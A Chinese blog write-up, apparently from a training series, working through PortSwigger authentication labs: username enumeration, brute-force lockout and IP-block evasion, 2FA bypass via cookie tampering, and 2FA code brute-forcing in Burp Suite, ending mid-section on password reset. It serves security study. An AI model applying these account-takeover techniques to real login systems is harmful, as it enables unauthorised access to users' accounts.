# 原创
：  【burpsuite安全练兵场-服务端2】身份认证漏洞-16个实验（全）

# 【burpsuite安全练兵场-服务端2】身份认证漏洞-16个实验（全）

  <img alt="" src="https://img-blog.csdnimg.cn/2e86bda3ff034c71920f2f40732c3929.gif"/>

## 前言：

> 
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/c2dfbe518f7d43a2978e4e6f1bfd5ea1.gif" width="24"/>介绍： </h3>
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>博主：网络安全领域狂热爱好者（承诺在CSDN永久无偿分享文章）。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>殊荣：CSDN网络安全领域优质创作者，2022年双十一业务安全保卫战-某厂第一名，某厂特邀数字业务安全研究员，edusrc高白帽，vulfocus、攻防世界等平台排名100+、高校漏洞证书、cnvd原创漏洞证书等。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>擅长：对于技术、工具、漏洞原理、黑产打击的研究。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>C站缘：C站的前辈，引领我度过了一个又一个技术的瓶颈期、迷茫期。
<hr/>
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：</h3>
<img alt="" height="23" src="https://img-blog.csdnimg.cn/b1b5426baac44b97b68428245cc35d77.png" width="23"/>面向读者：对于网络安全方面的学者。 
<img alt="" height="23" src="https://img-blog.csdnimg.cn/19ea593260b84ec8b836a336326fa0cc.png" width="23"/>本文知识点： 
（1）身份验证定义（√）
（2）基于密码的登录中的漏洞（√）
（3）多因素身份验证中的漏洞（√）
（4）其他身份验证机制中的漏洞（√）


### <img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：

> 
<h2> <img alt="" height="23" src="https://img-blog.csdnimg.cn/19e90c25b42d4b368c3c94da4b04afb0.png" width="23"/>让读者如虎添翼</h2>
<table border="1" cellpadding="1" cellspacing="1"><tbody>|服务端专项|所需基础知识|学习目标|状态
|[【0X01】SQL注入-17个实验（全）](https://blog.csdn.net/qq_53079406/article/details/128434815?spm=1001.2014.3001.5501)|1、数据库基本语法| 1、掌握SQL注入方法 2、掌握不同注入的区别 3、掌握注入的意义，即可以发现的信息 |已发布
|[【0X02】身份认证漏洞-16个实验（全）](https://blog.csdn.net/qq_53079406/article/details/128454196?spm=1001.2014.3001.5501)| 1、基本信收集 2、爆破工具的使用（如BP） 3、需要一点的逻辑分析能力 | 1、掌握身份验证的方法 2、掌握对数据包差别的细微分析 3、掌握身份认证的基本逻辑 |已发布
|[【0X03】目录遍历漏洞-6个实验（全）](https://blog.csdn.net/qq_53079406/article/details/128487462?spm=1001.2014.3001.5501)|1、对于路径的敏感度| 1、掌握路径模糊查询（爆破） 2、掌握基本的绕过方法 |已发布
|[【0X04】操作系统命令注入-5个实验（全）](https://blog.csdn.net/qq_53079406/article/details/128495612?spm=1001.2014.3001.5501)| 1、基本操作系统命令（可慢慢接触后学） 2、带外的平台（可慢慢发现） 3、带外的服务器（实验可使用BP提供的） | 1、掌握基本命令 2、掌握BP提供的服务器 3、掌握拼拼接命令 |已发布
|[【0X05】业务逻辑漏洞-11个实验（全）](https://blog.csdn.net/qq_53079406/article/details/128509488?spm=1001.2014.3001.5501)| 1、需要会基本的BP使用能力（后期可不断提高）  2、基础的数据包分析能力（可不断提升） | 1、掌握如何分析业务逻辑 2、掌握业务逻辑的可能缺陷 3、掌握业务逻辑的第三方功能 |已发布
|[【0X06】信息泄露漏洞-5个实验（全）](https://blog.csdn.net/qq_53079406/article/details/128544645?spm=1001.2014.3001.5501)| 1、需要会一些发现的工具（后期可不断使用新工具） 2、需要会一点Linux基本工具命令 | 1、掌握BP信息收集的工具的使用方法 2、掌握常见的信息泄露及其获取方法 |已发布
|【0X07】访问控制|即将发布，敬请期待|——|——
|【0X08】文件上传|即将发布，敬请期待|——|——
|【0X09】服务端请求伪造SSRF|即将发布，敬请期待|——|——
|【0X10】XEE注射|即将发布，敬请期待|——|——
</tbody></table>


---


**目录**

[一、身份验证定义](#%E4%B8%80%E3%80%81%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E5%AE%9A%E4%B9%89)

[1、三个身份验证因素](#1%E3%80%81%E4%B8%89%E4%B8%AA%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E5%9B%A0%E7%B4%A0)

[2、身份验证和授权](#2%E3%80%81%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E5%92%8C%E6%8E%88%E6%9D%83)

[3、身份验证漏洞的产生](#3%E3%80%81%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%BA%A7%E7%94%9F)

[4、实验的字典](#4%E3%80%81%E5%AE%9E%E9%AA%8C%E7%9A%84%E5%AD%97%E5%85%B8)

[二、基于密码的登录中的漏洞](#%E4%BA%8C%E3%80%81%E5%9F%BA%E4%BA%8E%E5%AF%86%E7%A0%81%E7%9A%84%E7%99%BB%E5%BD%95%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E)

[1、强制策略](#1%E3%80%81%E5%BC%BA%E5%88%B6%E7%AD%96%E7%95%A5)

[2、用户枚举](#2%E3%80%81%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE)

[3、有缺陷的强力保护](#3%E3%80%81%E6%9C%89%E7%BC%BA%E9%99%B7%E7%9A%84%E5%BC%BA%E5%8A%9B%E4%BF%9D%E6%8A%A4)

[        实验1：通过不同响应的用户名枚举](#%E5%AE%9E%E9%AA%8C1%EF%BC%9A%E9%80%9A%E8%BF%87%E4%B8%8D%E5%90%8C%E5%93%8D%E5%BA%94%E7%9A%84%E7%94%A8%E6%88%B7%E5%90%8D%E6%9E%9A%E4%B8%BE)

[        实验4：通过细微不同的响应进行用户名枚举](#%E5%AE%9E%E9%AA%8C4%EF%BC%9A%E9%80%9A%E8%BF%87%E7%BB%86%E5%BE%AE%E4%B8%8D%E5%90%8C%E7%9A%84%E5%93%8D%E5%BA%94%E8%BF%9B%E8%A1%8C%E7%94%A8%E6%88%B7%E5%90%8D%E6%9E%9A%E4%B8%BE)

[        实验5：通过响应计时的用户名枚举](#%E5%AE%9E%E9%AA%8C5%EF%BC%9A%E9%80%9A%E8%BF%87%E5%93%8D%E5%BA%94%E8%AE%A1%E6%97%B6%E7%9A%84%E7%94%A8%E6%88%B7%E5%90%8D%E6%9E%9A%E4%B8%BE)

[        实验6：断蛮力保护、IP块](#%E5%AE%9E%E9%AA%8C6%EF%BC%9A%E6%96%AD%E8%9B%AE%E5%8A%9B%E4%BF%9D%E6%8A%A4%E3%80%81IP%E5%9D%97)

[        实验7：通过帐户锁定枚举用户名](#%E5%AE%9E%E9%AA%8C7%EF%BC%9A%E9%80%9A%E8%BF%87%E5%B8%90%E6%88%B7%E9%94%81%E5%AE%9A%E6%9E%9A%E4%B8%BE%E7%94%A8%E6%88%B7%E5%90%8D)

[        实验13：暴力破解保护功能失效，每个请求有多个凭据](#%E5%AE%9E%E9%AA%8C13%EF%BC%9A%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E4%BF%9D%E6%8A%A4%E5%8A%9F%E8%83%BD%E5%A4%B1%E6%95%88%EF%BC%8C%E6%AF%8F%E4%B8%AA%E8%AF%B7%E6%B1%82%E6%9C%89%E5%A4%9A%E4%B8%AA%E5%87%AD%E6%8D%AE)

[三、多因素身份验证中的漏洞](#%E4%B8%89%E3%80%81%E5%A4%9A%E5%9B%A0%E7%B4%A0%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E)

[1、简述：](#1%E3%80%81%E7%AE%80%E8%BF%B0%EF%BC%9A)

[2、双因素身份验证令牌](#2%E3%80%81%E5%8F%8C%E5%9B%A0%E7%B4%A0%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E4%BB%A4%E7%89%8C)

[3、有缺陷的双因素验证逻辑](#3%E3%80%81%E6%9C%89%E7%BC%BA%E9%99%B7%E7%9A%84%E5%8F%8C%E5%9B%A0%E7%B4%A0%E9%AA%8C%E8%AF%81%E9%80%BB%E8%BE%91)

[4、暴力破解2FA验证码](#4%E3%80%81%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A32FA%E9%AA%8C%E8%AF%81%E7%A0%81)

[        实验2：2FA简单旁路](#%E5%AE%9E%E9%AA%8C2%EF%BC%9A2FA%E7%AE%80%E5%8D%95%E6%97%81%E8%B7%AF)

[        实验8：2FA断开逻辑](#%E5%AE%9E%E9%AA%8C8%EF%BC%9A2FA%E6%96%AD%E5%BC%80%E9%80%BB%E8%BE%91)

[        实验16：使用暴力攻击的2FA旁路（有一处数据包错误，已研究）](#%E5%AE%9E%E9%AA%8C16%EF%BC%9A%E4%BD%BF%E7%94%A8%E6%9A%B4%E5%8A%9B%E6%94%BB%E5%87%BB%E7%9A%842FA%E6%97%81%E8%B7%AF%EF%BC%88%E6%9C%89%E4%B8%80%E5%A4%84%E6%95%B0%E6%8D%AE%E5%8C%85%E9%94%99%E8%AF%AF%EF%BC%8C%E6%9A%82%E6%9C%AA%E7%A0%94%E7%A9%B6%E6%98%8E%E7%99%BD%EF%BC%89)

[四、其他身份验证机制中的漏洞](#%E5%9B%9B%E3%80%81%E5%85%B6%E4%BB%96%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E6%9C%BA%E5%88%B6%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E)

[1、简述：](#1%E3%80%81%E7%AE%80%E8%BF%B0%EF%BC%9A)

[2、保持用户登录](#2%E3%80%81%E4%BF%9D%E6%8C%81%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95)

[3、重置用户密码](#3%E3%80%81%E9%87%8D%E7%BD%AE%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81)

[        实验9：强制使用保持登录状态的Cookie](#%E5%AE%9E%E9%AA%8C9%EF%BC%9A%E5%BC%BA%E5%88%B6%E4%BD%BF%E7%94%A8%E4%BF%9D%E6%8C%81%E7%99%BB%E5%BD%95%E7%8A%B6%E6%80%81%E7%9A%84Cookie)

[        实验10：离线密码破解](#%E5%AE%9E%E9%AA%8C10%EF%BC%9A%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3)

[        实验3：密码重置逻辑错误](#%E5%AE%9E%E9%AA%8C3%EF%BC%9A%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E9%80%BB%E8%BE%91%E9%94%99%E8%AF%AF)

[        实验11：通过中间件的密码重置中毒](#%E5%AE%9E%E9%AA%8C11%EF%BC%9A%E9%80%9A%E8%BF%87%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E4%B8%AD%E6%AF%92)

[        实验12：通过更改密码暴力破解密码](#%E5%AE%9E%E9%AA%8C12%EF%BC%9A%E9%80%9A%E8%BF%87%E6%9B%B4%E6%94%B9%E5%AF%86%E7%A0%81%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81)

---


> 
<h2> <img alt="" height="28" src="https://img-blog.csdnimg.cn/0797a1b4a28e49479db240e038a7969d.png" width="28"/>助你一臂之力  </h2>
<h3>📋问题1：挖身份验证漏洞需要准备什么？</h3>
🎯信息收集（收集管理员，被攻击账号的相关消息）
🎯已有账号（将很大长度上提升挖到的概率）
🎯准备好字典
<hr/>
<h2>📋问题2：使用的工具有哪些？</h2>
🎯BP必备（爆破、数据包的分析）
🎯加解密工具（一些关键值一般会被加密）


## 📋问题2：使用的工具有哪些？

## 一、身份验证定义

> 
<h3>1、三个身份验证因素</h3>
(身份验证机制依赖于一系列技术来验证这些因素中的一个或多个)<br/> 知识因素：一些你知道，如密码或安全问题的答案。<br/> 占有因素：一些你有也就是像移动电话或安全令牌这样的物理对象。<br/> 内在因素：您的身份或行为，例如，您的生物特征或行为模式。
<hr/>
<h3><br/>2、身份验证和授权</h3>
身份验证：验证用户是否确实是他们自称的那个人<br/> 授权：涉及验证用户是否被允许做一些事情
<hr/>
<h3>3、身份验证漏洞的产生</h3>
身份验证机制很弱：不能充分地防止暴力攻击<br/> 身份验证失败：实现中的逻辑缺陷或糟糕的编码允许攻击者完全绕过身份验证机制<br/> 第三方身份验证机制中的漏洞
————
示例：<br/> 1、基于密码的登录中的漏洞：<br/> 2、多因素身份验证中的漏洞<br/> 3、其他身份验证机制中的漏洞
<hr/>
<h3>4、实验的字典</h3>
用户名：
[Authentication lab usernames | Web Security Academy](https://portswigger.net/web-security/authentication/auth-lab-usernames)
密码：
[Authentication lab passwords | Web Security Academy](https://portswigger.net/web-security/authentication/auth-lab-passwords)



### <br/>2、身份验证和授权

---


### 4、实验的字典

---


---


> 
<h2>二、基于密码的登录中的漏洞</h2>
<h3>1、强制策略</h3>
强制特定用户名，强制特定的密码组成
<hr/>
<h3>2、用户枚举</h3>
观察网站行为的变化，以确定给定用户名是否有效
在尝试强行登录页面时，应特别注意以下方面的任何差异
1、状态代码：爆破返回的状态代码对于绝大多数都是错误的。如果返回不同的状态代码，则表明用户名正确
————<br/> 2、错误信息：有时返回的错误信息会有所不同，具体取决于用户名和密码是否都不正确或只有密码不正确。（如密码错误的提示）
————<br/> 3、响应时间：如果大多数请求都是以相似的响应时间处理的，那么任何偏离这个响应时间的请求都表明有更多的步骤。（如用户名有效，网站可能仅检查密码是否正确。这个额外的步骤可能会导致响应时间稍微增加）<br/> ————
涉及实验：
实验1：通过不同响应的用户名枚举
实验4：通过细微不同的响应进行用户名枚举
实验5：通过响应计时的用户名枚举
<hr/>
<h3>3、有缺陷的强力保护</h3>
暴力攻击会涉及多次失败，暴力保护的核心是尽可能巧妙地自动执行该过程，并降低攻击者尝试登录的速度。
————<br/> 防止暴力攻击的两种最常见方法是：<br/> 1、锁定账号：如果远程用户尝试登录失败的次数过多（或其他标准），则锁定他们尝试访问的帐户
<pre><code>锁定帐户可提供一定程度的保护，防止针对特定帐户的暴力强制。然而，这种方法不能充分地防止暴力攻击，在这种攻击中，攻击者只是试图获得对他们所能访问的任何随机帐户的访问权。

可以使用以下方法来解决此类保护问题：
1、建立可能有效的候选用户名列表。这可以通过用户名枚举或简单地基于公共用户名列表来实现。 
2、确定一个非常小的密码候选名单，您认为至少有一个用户可能拥有这些密码。重要的是，您选择的密码数量不能超过允许的登录尝试次数。例如，如果您已计算出最多只能尝试3次，则最多需要选择3次密码猜测。 
3、使用Burp Intruder之类的工具，对每个候选用户名尝试每个选定的密码。这样，您就可以尝试强行访问每个帐户，而不会触发帐户锁定。您只需要一个用户使用三个密码中的一个就可以危害帐户。 
4、帐户锁定也无法防止凭据填充攻击。这涉及到使用大量的用户名：密码对字典，这些字典由在数据泄露中被盗的真实登录凭据组成。凭据填充依赖于许多人在多个网站上重复使用相同的用户名和密码这一事实，因此，字典中的一些受损凭据有可能在目标网站上也有效。帐户锁定无法防止凭据填充，因为每个用户名只尝试一次。凭据填充尤其危险，因为它有时会导致攻击者仅通过一次自动攻击就危及许多不同帐户的安全
</code></pre>
<br/> 2、锁定ip：如果远程用户连续进行过多的登录尝试，则阻止他们的IP地址 <br/> （都提供了不同程度的保护，但都不是无懈可击的，特别是在使用有缺陷的逻辑实现时）
<pre><code>用户速率限制

网站试图防止暴力攻击的另一种方法是通过用户速率限制。在这种情况下，在短时间内发出太多登录请求会导致您的IP地址被阻止。
用户速率限制有时比帐户锁定更可取，因为它不太容易受到用户名枚举和拒绝服务攻击。但是，它仍然没有完全安全。正如我们在前面的实验中看到的示例，攻击者可以通过多种方式操纵其表面IP来绕过拦截。

通常，只能通过以下方式之一解除阻止IP：
1、经过一段时间后自动执行
2、由管理员手动执行
3、用户在成功完成验证码后手动输入
4、由于该限制是基于从用户IP地址发送的HTTP请求的速率，因此如果您能够计算出如何通过单个请求猜测多个密码，有时也可以绕过此防御。 
</code></pre>
————
例如，如果多次登录失败，IP将被阻止。在一些实施方式中，但如果IP所有者成功登录，则用于失败尝试次数的计数器重置。这意味着攻击者只需每隔几次尝试就登录自己的帐户，以防止达到此限制。
在这种情况下，仅仅在整个单词列表中定期包含您自己的登录凭据就足以使这种防御措施实际上毫无用处。 <br/> ————
涉及实验：
实验6：断蛮力保护、IP块
实验7：通过帐户锁定枚举用户名
实验13：暴力破解保护功能失效，每个请求有多个凭据



### 2、用户枚举

---


> 
<h3>实验1：通过不同响应的用户名枚举</h3>
part1：
如果账号不存在，会有提示username不存在
（和实战中特别像）

<hr/>
part2:
爆破用户名

使用实验提供的usernaem

发现有一个长度不一样，提示的是密码的错误
账号：alterwind

<hr/>
part3：
爆破密码

使用实验提供的password
 <img alt="" height="659" src="https://img-blog.csdnimg.cn/fe129e1c25a64d05bd4a9b6ad10d302e.png" width="516"/>
发现了有一个长度不一样的，302跳转
尝试一下是不是密码
密码：aaaaaa

<hr/>
part4：
登陆进去了




---


> 
<h3>实验4：通过细微不同的响应进行用户名枚举</h3>
part1:
对用户名进行爆破

使用bp实验提供的username
 <img alt="" height="665" src="https://img-blog.csdnimg.cn/2e4eb5def02c47769482014bd0203a8c.png" width="559"/>
 在结果中发现有一个相应时长长一点，在想是不是username验证正确了，在验证密码了
（但最后结果是错的）


对爆破结果再分析
（提取错误的提示信息）

 发现了错误提示不一样
（最后验证密码后：正确用户名后面是空格，错误用户名是一个点）
账号：root

<hr/>
part2:
对密码进行爆破

 使用实验提供的password

 熟悉的302跳转
密码：666666

<hr/>
part3：
登陆
root/666666




---


> 
<h3>实验5：通过响应计时的用户名枚举</h3>
part1:
此实验，对ip有限制
爆破时候加上X-Forwarded-For: 

 payload1:
字典也就100来个，就设120就够了
 <img alt="" height="625" src="https://img-blog.csdnimg.cn/db1cca4bda814fea8294ba400cc12482.png" width="596"/>
 payload2:


提前设置把提示信息提取出来

<hr/>
part2:
分析结果
把时间勾上
有4个的时间，差不多都是1000

oracle
agent
vagrant
alerts

<hr/>
part3：
对密码进行爆破
payload2：
改为密码字典

（有延迟，很难准确爆破出）
<hr/>
part4：
登陆账号


---


> 
<h3>实验6：断蛮力保护、IP块</h3>
part1:
题目已经提供了
已有账号：wiener:peter
要攻击的用户名：carlos
（要准备和password一样多的账号数量，只能多）



因为每错次个就会封ip，所以在登陆错3次内，循环插入正确的账号和密码（且不能多线程，不然就容易直接错3次了）
（使用notepad++的替换功能）
正确账号：wiener

现在每2个里面就有一个正确账号


 现在将密码与正确账号对应上（正确密码：peter）


<hr/>
part2:
开始使用 
要攻击的用户名：carlos

 payload1：


 payload2：



<hr/>
part3:
结果分析（302是登陆成功后的跳转，找到账号为carlos的302跳转）
账号：carlos
密码：monitoring

<hr/>
part4:
登陆




---


> 
<h3>实验7：通过帐户锁定枚举用户名</h3>
part1:
发现重复登陆5次就会锁定账号，所以把所有账号重复进行5次枚举（使用集束炸弹Cluster bomb），观察响应包


错误的payload2：添加5个null payload
（密码应该不能为空）


正确的payload2：
直接密码1-5，是一样的效果
 <img alt="" height="614" src="https://img-blog.csdnimg.cn/6fbdffd83634448ebec709312e2a659f.png" width="674"/>
<hr/>
part2：
分析账号
账号：att


<hr/>
part3:
爆破账号att的密码
虽然有锁定，但尝试观察报错信息

 载入密码

 分析结果：
有一个长度出奇的短
（应该是提示信息不一样，当通过长度无法区分的时候，就提取提示信息）

 账号：att
密码：iloveyou

<hr/>
part4:
登陆




---


> 
<h3>实验13：暴力破解保护功能失效，每个请求有多个凭据</h3>
part1:
可以发现请求以JSON格式提交登录凭据

整理的好看点


提示攻击的用户为`carlos`
将密码全部以json的格式添加到password关键字后面
先变一个开头（第一个"自己手动加上去）

 再变一个结尾（最后一个"也自己手动加上去）

 直接复制上去，要加上[数据块]

 <img alt="" height="992" src="https://img-blog.csdnimg.cn/0849536068a64f60a315b818b41cd3ce.png" width="1200"/>





> 
<h2>三、多因素身份验证中的漏洞</h2>
<h3>1、简述：</h3>
<pre><code>1、双因素身份认证实际性：验证生物特征因素对大多数网站来说是不切实际的。但是，基于以下内容的强制和可选双因素身份认证（2FA）越来越常见你知道的事以及你有的东西。这通常需要用户从他们拥有的带外物理设备输入传统密码和临时验证码。

2、双因素身份验证更安全：虽然攻击者有时可以获得单个基于知识的因素（如密码），但同时从带外来源获得另一个因素的可能性要小得多。因此，双因素身份验证显然比单因素身份验证更安全。然而，与任何安全措施一样，它的安全性取决于其实施情况。与单因素身份验证一样，实现不佳的双因素身份验证可以被击败，甚至完全绕过。

3、只是被验证两次：只有通过验证多个不同因素。以两种不同的方式验证同一因素不是真正的双因素身份验证。基于电子邮件的2FA就是这样一个例子。尽管用户必须提供密码和验证码，但访问验证码仅依赖于他们知道其电子邮件帐户的登录凭据。因此，知识认证因素只是被验证两次。 
</code></pre>
<hr/>
<h3>2、双因素身份验证令牌</h3>
1、一些网站会将验证码以短信的形式发送到用户移动的上。虽然这在技术上还在验证“你所拥有的东西”的因素，但它是开放的滥用。
————
2、首先，代码是通过SMS传输的，而不是由设备本身生成的。这就产生了代码被拦截的可能性。此外，还存在交换SIM卡的风险，即攻击者通过欺诈手段获得带有受害者电话号码的SIM卡。然后，攻击者将收到发送给受害者的所有SMS消息，包括包含其验证码的消息。
————
3、绕过双因素身份验证
有时，双因素身份验证的实现存在缺陷，以至于可以完全绕过它（但是我尝试的经验，一般是前后端分离，只是前端绕过了能进去，但是没有数据）
————
如果用户首先被提示输入密码，然后被提示在单独的页面上输入验证码，则用户在输入验证码之前实际上处于“登录”状态。在这种情况下，值得测试一下，看看在完成第一个身份验证步骤后是否可以直接跳到“logged-in only”页面。有时候，您会发现网站在加载页面之前实际上并不检查您是否完成了第二步<br/> ————
涉及实验：
实验2：2FA简单旁路
<hr/>
<h3>3、有缺陷的双因素验证逻辑</h3>
有时，双因素身份验证中的逻辑缺陷意味着，在用户完成初始登录步骤后，网站无法充分验证同一用户是否正在完成第二步<br/>  
<pre><code>示例：
1、用户在第一步中使用其普通凭据登录，如下所示
POST /login-steps/first HTTP/1.1
Host: vulnerable-website.com
...
username=carlos&amp;password=qwerty


2、然后，在进入登录过程的第二步之前，他们将被分配一个与其帐户相关的cookie：
HTTP/1.1 200 OK
Set-Cookie: account=carlos

GET /login-steps/second HTTP/1.1
Cookie: account=carlos


3、提交验证码时，请求使用此cookie来确定用户尝试访问的帐户： 
POST /login-steps/second HTTP/1.1
Host: vulnerable-website.com
Cookie: account=carlos
...
verification-code=123456



4、在这种情况下，攻击者可以使用自己的凭据登录，然后更改cookie到任何任意用户名时提交验证码
POST /login-steps/second HTTP/1.1
Host: vulnerable-website.com
Cookie: account=victim-user
...
verification-code=123456
</code></pre>

如果攻击者随后能够强制验证代码，这将是极其危险的，因为这将允许他们完全基于用户名登录到任意用户的帐户。他们甚至不需要知道用户的密码。<br/> ————
涉及实验：
实验8：2FA断开逻辑
<hr/>
<h3>4、暴力破解2FA验证码</h3>
 1、与密码一样，网站需要采取措施防止2FA验证码被强行使用。这一点尤其重要，因为代码通常是一个简单的4位或6位数字。如果没有足够的强力保护，破解这样的代码是微不足道的。
2、一些网站试图通过在用户输入一定数量的不正确验证码时自动注销用户来防止这种情况。这在实践中是无效的，因为高级攻击者甚至可以通过以下方式自动执行此多步骤过程创建宏。该涡轮入侵者扩展也可用于此目的
————
涉及实验：
实验16：使用暴力攻击的2FA旁路


### 2、双因素身份验证令牌

---


### 4、暴力破解2FA验证码

> 
<h3>实验2：2FA简单旁路</h3>
已获得的凭据：wiener:peter
受害人的：carlos:montoya
双重验证绕过<br/> 第一重：密码验证<br/> 第二重：邮箱验证码
<hr/>
part1:
先登陆已有凭据wiener:peter
然后收取邮箱验证码

 <img alt="" height="861" src="https://img-blog.csdnimg.cn/d638800e09d34e16b7ac7e49dd3db30e.png" width="1200"/>

保存登录之后的url
<pre>`https://0ad10086030a7d84c14d583000a40062.web-security-academy.net/my-account`</pre>

 <img alt="" height="796" src="https://img-blog.csdnimg.cn/9479411406b64ee5bb398d0ddd262ed4.png" width="1200"/>
<hr/>
part2:
使用已有凭据登录carlos账户
carlos:montoya（验证账号密码）

到这个URL就是要验证邮箱了
<pre>`https://0ad10086030a7d84c14d583000a40062.web-security-academy.net/login2`</pre>

<hr/>
part3：
直接将换为登陆成功的URL尝试绕过第二重邮箱验证
即后面替换为/my-account
 就可以登陆成功
<pre>`https://0ad10086030a7d84c14d583000a40062.web-security-academy.net/my-account`</pre>




---


> 
<h3>实验8：2FA断开逻辑</h3>
信息：
已获得的凭据：wiener:peter<br/> 受害者账号：carlos
<hr/>
part1：
先登陆已获得的凭据：wiener:peter

 <img alt="" height="649" src="https://img-blog.csdnimg.cn/3888ea10ff1047ff88621ac576fe5b1b.png" width="1200"/>
<hr/>
part2:
思路分析：
在网站map搜host找到刚刚的数据包login
然后还GET请求了一个login2（请求中的用户为wiener）


思路：将用户改为我们要攻击的账号carlos，并重放就可以第二步验证的是攻击账号的账号了

（分析完以后，退出登陆wiener）
<hr/>
part3：
第一步验证的完整过程
 先使用wiener登陆，同时bp打开拦截

 放过第一个登陆的数据包

此时将第二个数据包的 verify值改为受害者账号（carlos）

 第三个数据包我也改为了carlos

<hr/>
part4：
第二步验证的完整过程
这一步是验证受害用户验证码了（4位数，直接爆破）

————
 （此处一个错误提示：千万别用蛮力，全部爆破完才出来，，此时靶场已经关了，服了，用顺序递增）


 此时靶场已关，重新来过（服了）<img alt="" height="419" src="https://img-blog.csdnimg.cn/c69160773efa46f3b3e4c5f46017374a.png" width="1200"/>
 ————
重新爆破（换数值递增的方法）
注意：verify=carlos需要改为受害者（否则失败）


（爆破5次发现，官方基本上把验证码设置为了1000以下）

 把线程调大点




 <img alt="" height="876" src="https://img-blog.csdnimg.cn/26c1584a2b854dcc85c330cce5278865.png" width="1200"/>



---


---


> 
<h3>实验16：使用暴力攻击的2FA旁路（有一处数据包错误，已研究明）</h3>
再次分析错误的地方时候：
最后一步可能需要上一步的验证参数
<hr/>
前提：
受害人凭据：carlos:montoya<br/> 但无权访问用户的 2FA 验证码（暴力破解）
<hr/>
part1:
登录用户carlos，提交任意验证码0000<br/> （目的收集数据包，验证码对不对无所谓）


<hr/>
part2:
Project options（项目选项）---&gt;sessions---&gt;add

 scope（范围）---&gt; all urls





提示：我以为老版的不能多选，就换了最新版试试
正确操作：多选条，然后删除多余的
再点击test macro


————
第三个数据包是200，是正常的
（但是我第二个数据包变成了400，不是302了，按道理账号密码是正确得跳转，并获得session）

然后都点击确认OK

 <img alt="" height="796" src="https://img-blog.csdnimg.cn/641e6b58dc79410cad1aa0ee67ef9872.png" width="1200"/>

再准备进行验证码爆破

 <img alt="" height="796" src="https://img-blog.csdnimg.cn/23f418ed18444e6dbb15418abb8d7132.png" width="1200"/>
 <img alt="" height="749" src="https://img-blog.csdnimg.cn/25f60ee487ca4a82a5dfcff1095ea306.png" width="513"/>



---


> 
<h2>四、其他身份验证机制中的漏洞</h2>
<h3>1、简述：</h3>
除了基本的登录功能外，大多数网站还提供了允许用户管理其帐户的补充功能。例如，用户通常可以更改其密码或在忘记密码时重置密码。这些机制还可能引入可被攻击者利用的漏洞。<br/>  
网站通常会注意避免在其登录页面中出现众所周知的漏洞。但是很容易忽略这样一个事实，即需要采取类似的步骤来确保相关功能同样健壮。这在攻击者能够创建自己的帐户并因此能够轻松访问以研究这些附加页面的情况下尤为重要。 <br/>  
<hr/>
<h3>2、保持用户登录</h3>
一个常见的功能是即使在关闭浏览器会话后仍保持登录状态的选项。这通常是一个简单的复选框，标记为“记住我”或“保持我的登录状态”。<br/>  
<pre><code>1、破解公式：此功能通常通过生成某种“记住我”标记来实现，然后将其存储在持久性cookie中。由于拥有此cookie可以有效地让您绕过整个登录过程，因此最好不要猜测此cookie。但是，有些网站会根据可预测的静态值（如用户名和时间戳）的串联来生成此Cookie。有些甚至将密码作为cookie的一部分。如果攻击者能够创建自己的帐户，这种方法尤其危险，因为他们可以研究自己的cookie并可能推断出它是如何生成的。一旦他们计算出了公式，他们就可以尝试强行使用其他用户的cookie来访问他们的帐户。

2、破解加密算法：一些网站假设，如果cookie以某种方式加密，即使它使用静态值，也无法猜测。如果操作正确，这可能是真的，但是使用简单的双向编码（如Base64）天真地“加密”cookie并不能提供任何保护。即使使用正确的单向哈希函数加密也不是完全安全的。如果攻击者能够轻松地识别散列算法，并且不使用salt，那么他们可能会通过简单地散列他们的单词列表来暴力破解Cookie。如果没有对cookie猜测应用类似的限制，则可以使用此方法绕过登录尝试限制。

3、XSS攻击：即使攻击者无法创建自己的帐户，他们仍然可以利用此漏洞。使用常用的技术（如XSS），攻击者可以窃取另一个用户的“记住我”cookie，并从中推断出cookie是如何构造的。如果网站是使用开源框架构建的，Cookie构建的关键细节甚至可能会公开记录。

4、密码哈希：在极少数情况下，即使经过哈希处理，也可能从Cookie中以明文形式获得用户的实际密码。众所周知的密码列表的散列版本可以在网上找到，所以如果用户的密码出现在其中一个列表中，解密散列有时可能就像将散列粘贴到搜索引擎中一样微不足道。这证明了salt在有效加密中的重要性。 
</code></pre>
————
涉及实验：
实验9：强制使用保持登录状态的Cookie
实验10：离线密码破解
<hr/>
<h3>3、重置用户密码</h3>
1、通过电子邮件发送密码
